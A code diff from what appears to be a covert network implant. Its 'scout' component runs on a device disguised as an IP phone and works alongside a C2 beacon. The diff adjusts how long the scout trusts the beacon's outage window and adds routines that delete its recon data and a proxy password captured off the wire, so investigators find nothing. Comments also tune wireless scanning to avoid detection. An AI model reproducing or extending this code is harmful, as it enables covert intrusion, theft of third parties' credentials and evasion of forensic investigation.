@@ -62,11 +62,26 @@ _CAPTURE_SLICE = 15
 # scans for wireless networks four times a minute for ever is its own
 # detection signature. Raised to the publishing interval when `run` starts.
 _SCAN_EVERY = 300
-# How long after the beacon last wrote its window this process still
-# believes it. Generous, because a stuck window is the case this exists
-# for and the beacon rewrites the file every cycle: at the shipped 300 s
-# interval that is twelve missed cycles.
+# The floor on how long after the beacon last wrote its window this
+# process still believes it. Generous, because a stuck window is the case
+# this exists for and the beacon rewrites the file every cycle: at the
+# shipped 300 s interval that is twelve missed cycles. `_window_ceiling`
+# raises it for a build whose interval is longer, because
+# `beacon_interval_seconds` has a floor and no ceiling -- at 7200 s a
+# fixed hour would read every live window as dead for most of every
+# cycle, and the scout would throw its evidence and its captured
+# credential away each time.
 _WINDOW_STALE_AFTER = 3600
+# How many of the beacon's own cycles a window may go unwritten for.
+_WINDOW_STALE_CYCLES = 12
+# And the longest cycle this process will believe a window's own numbers
+# about. The beacon's interval has no upper bound, but a window whose
+# numbers imply a cycle longer than a day does not describe a beacon this
+# process can usefully serve -- the design's worst case for an outage is a
+# week, which is seven of those -- and believing it would leave an
+# IP-phone-shaped device capturing and scanning the radio for ever on the
+# strength of one field in one file.
+_MAX_CYCLE_SECONDS = 86400
 
 
 def _parse_scan(output: str) -> List[dict]:
@@ -151,6 +166,10 @@ class Scout(object):
         self._scan_interval = float(_SCAN_EVERY)
         self.evidence = Evidence(own_mac=self._own_mac(),
                                  host_macs=self._host_macs())
+        # The `opened` stamp of the window this evidence belongs to, or
+        # None before the first one is seen. `_window_turned` is where it
+        # matters and why.
+        self._window = None
         self._running = True
 
     # ── the question the loop asks ──
@@ -177,7 +196,46 @@ class Scout(object):
         touched = state.get("touched")
         if not isinstance(touched, (int, float)) or isinstance(touched, bool):
             return True
-        return abs(time.time() - float(touched)) <= _WINDOW_STALE_AFTER
+        return abs(time.time() - float(touched)) <= self._window_ceiling(state)
+
+    def _window_ceiling(self, state: dict) -> float:
+        """How long a window may go unwritten before this process drops it.
+
+        Twelve of the **beacon's own cycles**, floored at an hour.
+        `beacon_interval_seconds` is the operator's and has no upper
+        bound -- `_way_out_points` reasons carefully about exactly that
+        control on the other side of the handoff, and this side used a
+        fixed hour. At a two-hour interval every live window read as dead
+        for most of every cycle, so the scout dropped its evidence and
+        deleted its captured credential on each poll, and rungs 2 to 4
+        had nothing left to act on.
+
+        **Read from the window itself, not from the config file.** The
+        beacon's interval is re-set at runtime by the `sleep` task verb
+        and by `reconfig`'s `sleeptime`, so the yaml is only what it
+        started with -- and the window carries the live number already:
+        `hours_dark` is `stuck_cycles * interval / 3600`, so the two of
+        them say what a cycle currently costs. The config is the fallback
+        for a window that does not carry both.
+        """
+        return max(float(_WINDOW_STALE_AFTER),
+                   _WINDOW_STALE_CYCLES * self._cycle_seconds(state))
+
+    def _cycle_seconds(self, state: dict) -> float:
+        """How long one of the beacon's cycles currently takes."""
+        cycles = state.get("stuck_cycles")
+        hours = state.get("hours_dark")
+        if (isinstance(cycles, int) and not isinstance(cycles, bool)
+                and cycles > 0
+                and isinstance(hours, (int, float))
+                and not isinstance(hours, bool) and hours > 0):
+            return min(float(_MAX_CYCLE_SECONDS),
+                       (float(hours) * 3600.0) / float(cycles))
+        raw = _block(self.config, "c2").get("beacon_interval_seconds")
+        try:
+            return max(0.0, float(raw))
+        except (TypeError, ValueError):
+            return 0.0
 
     def observe(self, packet) -> None:
         """One captured frame. Raises nothing, whatever it is."""
@@ -216,6 +274,19 @@ class Scout(object):
         state = handoff.read_state(self.state_dir)
         if state is None:
             return None
+        # **Which window this is**, before anything of the last one is
+        # published into it. Noticing a window *close* is not enough: the
+        # only place that did was the `else` arm of `run`, which sees a
+        # window end only if it happens to look while there is none -- and
+        # this process looks every `document_max_age_seconds / 2` while the
+        # beacon's outages turn over on its own cycle. One leg delivering
+        # and the next one failing inside that sleep made a new window the
+        # scout never saw begin, and it then republished the previous
+        # outage's captured credential into it with a *fresh* stamp -- past
+        # the beacon's own `written < opened` guard, which is the whole
+        # point of that guard. The stamp the beacon keeps for exactly this
+        # is `opened`: one window, one stamp.
+        self._window_turned(state.get("opened"))
         # The bridge may have learned a new device, or aged one out, since
         # the last publish.
         self.refresh_identity()
@@ -243,6 +314,54 @@ class Scout(object):
                 "will decide on its policy alone", self.state_dir, exc)
             return None
         return document
+
+    def _window_turned(self, opened) -> None:
+        """Start again if this is a different stuck window. Raises nothing.
+
+        A window's evidence belongs to that window: "a failure from three
+        outages ago would drive a decision today" is the reason the `else`
+        arm of `run` drops it, and this is the same rule applied where it
+        can actually be seen. Compared by the beacon's `opened` stamp,
+        which is carried unchanged for the life of a window and is the
+        only thing either side has that names one.
+
+        A window with no stamp -- a beacon older than the field -- is
+        treated as the same window, for the reason `wanted()` believes one
+        with no `touched`: reading an upgrade as a new window every cycle
+        would throw the evidence away every cycle.
+        """
+        if not isinstance(opened, (int, float)) or isinstance(opened, bool):
+            return
+        if self._window is not None and self._window == opened:
+            return
+        if self._window is not None:
+            logger.info("scout: this is a new stuck window (opened %.0f, "
+                        "the last one %.0f), so the evidence starts again",
+                        opened, self._window)
+            self._forget()
+        self._window = opened
+
+    def _forget(self) -> None:
+        """Drop this window's evidence and the two files that carried it.
+
+        One statement in three places: the next window starts from
+        nothing. The borrow file is the one that holds a **secret** -- a
+        third party's proxy password, off the wire -- and the document
+        holds the host's MAC and IP, its proxies and resolvers, its TLS
+        destinations and the SSIDs in range. Both **removed** rather than
+        written empty, so there is nothing on the disk of a device built
+        to look like an IP phone for the next reader, or the next
+        investigator, to find. The beacon does the same with its own
+        window file; between them the handoff leaves only the trail,
+        which is the one artefact this design means to outlive an
+        outage, and `dhclient`'s lease.
+
+        Raises nothing: `handoff.remove` does not.
+        """
+        self.evidence = Evidence(own_mac=self._own_mac(),
+                                 host_macs=self._host_macs())
+        handoff.remove(handoff.borrow_path(self.state_dir))
+        handoff.remove(handoff.document_path(self.state_dir))
 
     def _tap_fields(self) -> dict:
         fields = self.evidence.as_document_fields()
@@ -439,19 +558,19 @@ class Scout(object):
             else:
                 # A window that closed is a window whose evidence is spent:
                 # the next one starts from nothing, or a failure from three
-                # outages ago would drive a decision today.
-                self.evidence = Evidence(own_mac=self._own_mac(),
-                                         host_macs=self._host_macs())
-                # And the borrow file goes with it, because it is the one
-                # file in this handoff that carries a **secret**: a third
-                # party's proxy password, taken off the wire. The beacon
-                # removes its own window when a leg delivers and then
-                # stops writing, so nothing else here would ever have
-                # removed this -- a captured password sat on the disk of a
-                # device built to look like an IP phone until somebody
-                # reimaged it. Removed rather than overwritten empty, so
-                # there is no file to find at all. Raises nothing.
-                handoff.remove(handoff.borrow_path(self.state_dir))
+                # outages ago would drive a decision today. The captured
+                # password goes with it -- it is the one file in this
+                # handoff that carries a secret, the beacon removes its own
+                # window when a leg delivers and then stops writing, so
+                # nothing else here would ever have removed it.
+                #
+                # `_forget` and not a second copy of it, because this arm
+                # is only *one* of the two ways a window ends: the other is
+                # a window that turned over between two of these polls,
+                # which this arm cannot see at all. `_window_turned` has
+                # that story.
+                self._forget()
+                self._window = None
                 self._sleep(min(interval, 30))
 
     def _sleep(self, seconds: float) -> None:
